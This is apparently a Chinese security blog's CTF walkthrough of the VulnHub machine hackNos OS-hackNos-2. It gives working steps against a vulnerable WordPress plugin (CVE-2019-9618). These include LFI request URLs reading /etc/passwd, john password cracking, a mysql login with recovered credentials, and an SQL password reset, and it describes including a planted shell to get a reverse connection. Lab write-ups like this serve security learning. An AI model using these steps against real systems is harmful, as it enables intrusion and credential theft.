> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/CTxe7Axdf-lOfi9F2CNuAQ)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **53** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/B5jnBA4aK2PVgpPXb3icia4IlhPWpUcVPKuLZFVgM0MicWLQyBHHjNCzleyNttcQUrMMNEQiavJmdOibTEtbd7qy3NA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/vGvT20PEzJu8qDXo8Ik8BbvLexAFMvas1XwaWM6j82m0N3JZwN9ka2DyxZ2Wib9480zfzoRyu2biawhDFdc3mtUg/640?wx_fmt=png)

靶机地址：https://www.vulnhub.com/entry/hacknos-os-hacknos,401/

靶机难度：容易 + 中级（CTF）

靶机发布日期：2019 年 11 月 29 日

靶机描述：

Difficulty : Easy to Intermediate

Flag : 2 Flag first user And second root

Learning : Web Application | Enumeration | Password Cracking

Changelog - 2019-12-13 ~ v1.1 - 2019-11-29 ~ v1.0

请注意：对于所有这些计算机，我已经使用 VMware 运行下载的计算机。我将使用 Kali Linux 作为解决该 CTF 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/4T3W5gcXFFfEEGbktbgibuyOhFPiaDLPHm6AN3KgGzHAAVrSClvCUyjWzMUgHlDz1erKjfV4fessborPkTWYl76w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_svg/jRoggJ2RF3BHibojhJQ8jmNderYtvTh8HkyBLp8nlK1B262IP84ZEic7el5hZ1rSy2RRjsGUQxdSGiaPFGG66pA8FnblLMZNWzA/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_svg/jJSbu4Te5ib8dv7tckM3eiau36jYD6r6JzUadPhLfh5pBPkc7MXuibrLRyxucMXeHZMwuc8YJbmickBgMbiaNAGWJ6u8K69OmxYXp/640?wx_fmt=svg)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_svg/Iic9WLWEQMg188DeVtNKRm1TKjRbm9lMO1Sn0Nxp4ub3M6m1ib29Pg42QpAsl2KtUhGicZIM8mBLAW0BTviaOLUdwnDUBNpqgNlQ/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_svg/Ib5852jAyb9xjIOSr4AGdwHrOa5leGNTnFwkWXvaOsQMx7bVxQiabjjSeicggObSK25jW1K5mG6aNZia8VJuiaarScZkKOYlJP4a/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOKP4kES7fnRzG5vZLUGybhiaxicapMrPAw2vcQDK36hoeWe7ht8cEoF9kJkBUNxso08CujRJv4gsmA/640?wx_fmt=png)

我们在 VM 中需要确定攻击目标的 IP 地址，需要使用 nmap 获取目标 IP 地址：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOKP4kES7fnRzG5vZLUGybhk9BUdLhibbymFU4kiaxtMkpPr7MDON4Ezc9qYGNMDMDqpZoTaib3wQs4Q/640?wx_fmt=png)

我们已经找到了此次 CTF 目标计算机 IP 地址：192.168.56.144

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOKP4kES7fnRzG5vZLUGybhsnfUWHvA98TYeTNFYeYP32Gs4WZEia9cqnlsibIp4iaeHMaVSzzcQfj5g/640?wx_fmt=png)

nmap 发现开放了 22、80 端口... 这里和 1 一样的...

前面做了 1 之后... 直接爆破把...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOKP4kES7fnRzG5vZLUGybhW5SaNamrPfWbKBv7yRK2rT0OnFbulBJfRw8CaT3AhZWuIWRAiaiaXgCQ/640?wx_fmt=png)

发现 tsweb 目录... 往下看可以发现，这是 wordpress CMS 架构的，可以使用 wpscan...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOKP4kES7fnRzG5vZLUGybhxm8BSzf3l98guAT2A7Rh1jWYG2sPibOy1SDwpiaoYW9LCtKY6pTKHXrg/640?wx_fmt=png)

直接上 wpscan 先...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOKP4kES7fnRzG5vZLUGybh3kAXS6WaTTbXFqoGX51qwEp7J69V72rTTtDYeNN7ICJgiaIg0sD5I4Q/640?wx_fmt=png)

熟悉的 gracemedia-media-player 插件... 谷歌查找下...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOKP4kES7fnRzG5vZLUGybhwHHMMnTQy6xLJnILUUdjhPEVA9EkvstRXJhkqaxLGjm6CQh6ftEQIA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOKP4kES7fnRzG5vZLUGybhf0fGXwteOvAicSC9s2JW3K1Huw6UsYlye9qPuicq5kcLQuBSicvIH4p5g/640?wx_fmt=png)

可以利用 CVE-2019-9618 漏洞渗透...

```
[链接](https://www.exploit-db.com/exploits/46537)
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOKP4kES7fnRzG5vZLUGybh2JXTaUmAS0nH2sH7VKeJX0VewXC01sQjicfrd1HGWJG3gR669s9IGBg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOKP4kES7fnRzG5vZLUGybhibPcRnuN8ANtrdETK3jWoLJm6qJuYica5PmFodxpnPLiaLxILJiaR9IonQ/640?wx_fmt=png)

```
http://192.168.56.144/tsweb/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../etc/passwd
发现：flag:$1$flag$vqjCxzjtRc7PofLYS2lWf/
```

这是哈希值...john 爆破下...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOKP4kES7fnRzG5vZLUGybhyAGfNXib6ztZ7ibmNaBZlDtnrM90edC7J0flVRgniatsMbqteiahbicBmJw/640?wx_fmt=png)

```
john  --wordlist=/usr/share/wordlists/rockyou.txt dayu
john --show dayu
获得账号和密码：flag，topsecret
```

![](https://mmbiz.qpic.cn/mmbiz_svg/jRoggJ2RF3BHibojhJQ8jmNderYtvTh8HkyBLp8nlK1B262IP84ZEic7el5hZ1rSy2RRjsGUQxdSGiaPFGG66pA8FnblLMZNWzA/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_svg/jJSbu4Te5ib8dv7tckM3eiau36jYD6r6JzUadPhLfh5pBPkc7MXuibrLRyxucMXeHZMwuc8YJbmickBgMbiaNAGWJ6u8K69OmxYXp/640?wx_fmt=svg)

二、提权

![](https://mmbiz.qpic.cn/mmbiz_svg/Iic9WLWEQMg188DeVtNKRm1TKjRbm9lMO1Sn0Nxp4ub3M6m1ib29Pg42QpAsl2KtUhGicZIM8mBLAW0BTviaOLUdwnDUBNpqgNlQ/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_svg/Ib5852jAyb9xjIOSr4AGdwHrOa5leGNTnFwkWXvaOsQMx7bVxQiabjjSeicggObSK25jW1K5mG6aNZia8VJuiaarScZkKOYlJP4a/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSAREPVibEia2cobtJkaRmwn2vC7WxqVa7iaUpgRUJ7cQuw9q1ahbIRsDaMz7VtB8icC1ec3funvK9mokEBibNOdrvLL/640?wx_fmt=svg)

方法 1

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOKP4kES7fnRzG5vZLUGybhOibYXZgrkibWr1eqUOYIfAxCeIibvHibYZTAssg3wpPqoX0vLHVrqrYjNA/640?wx_fmt=png)

成功登录...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOKP4kES7fnRzG5vZLUGybht3VO2fzN1ibOReETviaNRa9Hz0sLicDYXOibgfJP8GdQFshHTnT9TKqmdg/640?wx_fmt=png)

注意这里是受限制的，提到 TTY 即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOKP4kES7fnRzG5vZLUGybhmrGElUyDRSvtJOaCDKgA8blsoC598NaLwx6oNJx9on7ujUUA511ouQ/640?wx_fmt=png)

没权限使用此命令... 那就只能 root 查看了，跳过...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOKP4kES7fnRzG5vZLUGybhgwIc3QLQQCSgMlAISp0v7gGIk9HVpKnv2K23q2jLXPR3ibnsMBPric2A/640?wx_fmt=png)

这里找了半天，才发现 backups 下有个 pass... 应该是密码... 发现了 MD5 值...

```
$1$rohit$01Dl0NQKtgfeL08fGrggi0
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOKP4kES7fnRzG5vZLUGybh18Hia4XBic1Sb6BJrFNsibVTQEWodXbFcrPqOpFnzbQSd7KGNLBg3LNQw/640?wx_fmt=png)

```
john爆破密码：!%hack41
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOKP4kES7fnRzG5vZLUGybhia33qoEIhictiaicMLe7atM6DiaKvVjacQQjMQAzkbSMsQOEiaYL7lDbIeibg/640?wx_fmt=png)

拿到第一个 flag...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOKP4kES7fnRzG5vZLUGybhcG06Gxh02ZMiaeicM8welBkia9CbwcT5c0S84IRlDY1VUb5CVVbFenibkA/640?wx_fmt=png)

ALL... 提权就是...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOKP4kES7fnRzG5vZLUGybhFFDQ5YSaftRVmkBSRolvqziamtfHhlaeic2qjxZfyrZrub0B0EFRzTBA/640?wx_fmt=png)

前面 id 可以查看到可执行 sudo... 直接 sudo su 提权到 root 用户，并查看第二个 flag...

![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSAREPVibEia2cobtJkaRmwn2vC7WxqVa7iaUpgRUJ7cQuw9q1ahbIRsDaMz7VtB8icC1ec3funvK9mokEBibNOdrvLL/640?wx_fmt=svg)

方法 2

  

  

前面通过查看 pass 文件直接获得密码.... 然后 sudo 提权...

这边我利用数据看看...GO

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOKP4kES7fnRzG5vZLUGybhu3MG0sOibypgib8UXIBAc3AziaJ6ZkeoM6v660v9e4RN3TWyKNsuNTCDA/640?wx_fmt=png)

前面获得 flag 方法一样... 继续提 root 权限...

一路跟着我学习过来的都知道，查看数据库需要找到 wp-config.php 文件... 里面包含了数据库账号密码... 找它！！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOKP4kES7fnRzG5vZLUGybh6r0dQT64OBEXZHPyguphVooyO4ZH69MjTSia8RDwIjBQibDISRsaVUfQ/640?wx_fmt=png)

一般都在 html 目录下面查找... 找到了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOKP4kES7fnRzG5vZLUGybhyHw1GGLrc7utsqKZKXbcxytp5FOnhBu0du80iaRx46vYbCbSicnJvklw/640?wx_fmt=png)

```
发现用户名密码：wpuser、hackNos-2.com
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOKP4kES7fnRzG5vZLUGybhYyVFicWS55RNemXGk7ztSM0aNHjRjHDw9FeuUOVJy6guicBSJUmesiaBQ/640?wx_fmt=png)

```
mysql -h localhost -uwpuser -phackNos-2.com
$P$B.O0cLMNmn7EoX.JMHPnNIPuBYw6S2/
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOKP4kES7fnRzG5vZLUGybhcIlknXYyylufkWBuztS2CXvI4CXdEn4zlLnFo2Lpdd8OwrPhHPaoPw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOKP4kES7fnRzG5vZLUGybh9GRtlanG11dKESrvOaXlAiaujvSOOHt0hfRk8FCB17Pr566xalCGJww/640?wx_fmt=png)

解密不出，跳过跳过... 等了半天半天，最后也没解密出来...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOKP4kES7fnRzG5vZLUGybhzTRwy9KBTqibA0PRhoTIwaaxPQaekLicNQSjrV0mLtQSsfn54s6knDpA/640?wx_fmt=png)

```
update wp_users set user_pass=md5("dayu") where user_login='user';
```

这里我直接使用命令，虽然破解不了，我将 user 用户密码修改为 dayu

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOKP4kES7fnRzG5vZLUGybhficRJZ72ddicMn1gLibvK7tsrrKJYTuOpfgFzRnDORqvOlFtz4wKlVz9w/640?wx_fmt=png)

成功通过用户密码：

```
user/dayu
```

登陆进入...  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOKP4kES7fnRzG5vZLUGybhxag7EntKMQKtUZpX2ibgxmtphuEBYv4PEzx005HjmlvL2IukPofxnQw/640?wx_fmt=png)

进来后，很熟悉的界面了，这里直接利用即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOKP4kES7fnRzG5vZLUGybhBZsMC5bvr4Fsic3r6GsTjLH3Go3J5GGp09sxRoO53QnruicLMKatmGUw/640?wx_fmt=png)

将 dayushell 复制进来... 利用 readme.txt 即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOKP4kES7fnRzG5vZLUGybhg0nE89663qCwNMU2vaqGyoajJRP1Bpa8QL5vXe6yDeqt8p5Abkjs7Q/640?wx_fmt=png)

然后利用之前的 LFI 漏洞包含该 txt 文件即可... 记得本地开启 nc...

```
192.168.56.144/tsweb/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../var/www/html/tsweb/wp-content/themes/twentytwenty/readme.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOKP4kES7fnRzG5vZLUGybh49BdEwibk1A9OQRy3U5GiamHH3iacfvhsv5xc0r1w2CuFA3c55DuiakevQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/B5jnBA4aK2PVgpPXb3icia4IlhPWpUcVPKuLZFVgM0MicWLQyBHHjNCzleyNttcQUrMMNEQiavJmdOibTEtbd7qy3NA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/vGvT20PEzJu8qDXo8Ik8BbvLexAFMvas1XwaWM6j82m0N3JZwN9ka2DyxZ2Wib9480zfzoRyu2biawhDFdc3mtUg/640?wx_fmt=png)

看来只能获得 www-data 权限... 这边继续往下走就能获得 root... 不过这是一个思路，可能还有别的方法... 如果有请告诉我，谢啦！！

凌晨文章...

由于我们已经成功得到 root 权限查看 flag，因此完成了简单靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/4T3W5gcXFFfEEGbktbgibuyOhFPiaDLPHm6AN3KgGzHAAVrSClvCUyjWzMUgHlDz1erKjfV4fessborPkTWYl76w/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)